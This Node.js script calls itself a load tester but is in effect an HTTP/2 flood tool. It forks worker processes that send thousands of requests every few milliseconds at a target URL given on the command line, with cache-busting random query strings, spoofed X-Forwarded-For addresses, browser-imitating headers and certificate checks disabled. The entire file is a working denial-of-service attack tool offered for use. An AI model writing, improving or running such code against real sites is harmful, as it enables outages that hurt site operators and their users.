const http2 = require('http2');
const tls = require('tls');
const cluster = require('cluster');
const url = require('url');
const fs = require('fs');

process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err.message);
});

if (process.argv.length < 6) {
    console.log('Usage: node load_test_optimized.js <target> <time> <rate> <threads> <proxyfile>');
    process.exit(1);
}

function readLines(filePath) {
    if (!fs.existsSync(filePath)) {
        console.error(`File ${filePath} not found`);
        process.exit(1);
    }
    const lines = fs.readFileSync(filePath, 'utf-8').toString().split(/\r?\n/).filter(line => line.trim());
    if (lines.length === 0) {
        console.error(`Proxy file ${filePath} is empty`);
        process.exit(1);
    }
    return lines;
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function randomIP() {
    return `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}`;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const parsedTarget = url.parse(args.target);
if (!parsedTarget.protocol || !parsedTarget.host) {
    console.error('Invalid target URL');
    process.exit(1);
}

const headers = {
    ':method': 'GET',
    ':authority': parsedTarget.host,
    ':path': parsedTarget.path || '/',
    ':scheme': 'https',
    'sec-ch-ua': '"Google Chrome";v="117"',
    'sec-ch-ua-platform': 'Windows',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US',
    'accept': 'text/html,application/json',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'referer': `https://${parsedTarget.host}/`
};

const proxies = readLines(args.proxyFile);
let requestCount = 0;
let errorCount = 0;

if (cluster.isMaster) {
    console.clear();
    console.log(`Load Testing Target: ${parsedTarget.host}`);
    console.log(`Duration: ${args.time} seconds`);
    console.log(`Threads: ${args.threads}`);
    console.log(`RPS: ${args.rate}`);
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    setInterval(() => {
        console.log(`Requests sent: ${requestCount}, Errors: ${errorCount}, RPS: ${(requestCount / (Date.now() / 1000)).toFixed(2)}`);
    }, 5000);
    setTimeout(() => {
        console.log('Load test completed.');
        process.exit(0);
    }, args.time * 1000);
} else {
    setInterval(runLoadTest, 5);
}

function runLoadTest() {
    const proxyAddr = randomElement(proxies);
    const [proxyHost, proxyPort] = proxyAddr.split(':');
    if (!proxyHost || !proxyPort) {
        console.error(`Invalid proxy format: ${proxyAddr}`);
        errorCount++;
        return;
    }

    const tlsOptions = {
        secure: true,
        ALPNProtocols: ['h2'],
        ciphers: 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
        ecdhCurve: 'auto',
        host: parsedTarget.host,
        servername: parsedTarget.host,
        rejectUnauthorized: false,
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3'
    };

    const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
    tlsConn.setKeepAlive(true, 60000);

    const client = http2.connect(parsedTarget.href, {
        protocol: 'https:',
        settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 15000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false
        },
        createConnection: () => tlsConn,
        maxSessionMemory: 150000
    });

    client.on('connect', () => {
        const intervalAttack = setInterval(() => {
            const batchSize = Math.min(args.rate, 3000);
            for (let i = 0; i < batchSize; i++) {
                const request = client.request({
                    ...headers,
                    ':path': parsedTarget.path + '?' + randstr(10) + '=' + randstr(5),
                    'x-forwarded-for': randomIP()
                });
                request.on('response', () => {
                    requestCount++;
                    request.close();
                    request.destroy();
                });
                request.on('error', () => {
                    errorCount++;
                    request.close();
                    request.destroy();
                });
                request.end();
            }
        }, 5);

        setTimeout(() => {
            clearInterval(intervalAttack);
            client.destroy();
            tlsConn.destroy();
        }, args.time * 1000);
    });

    client.on('error', (err) => {
        errorCount++;
        console.error(`Client error: ${err.message}`);
        client.destroy();
        tlsConn.destroy();
        setTimeout(runLoadTest, 1000 * Math.pow(2, Math.min(errorCount, 5)));
    });

    client.on('close', () => {
        client.destroy();
        tlsConn.destroy();
    });
}
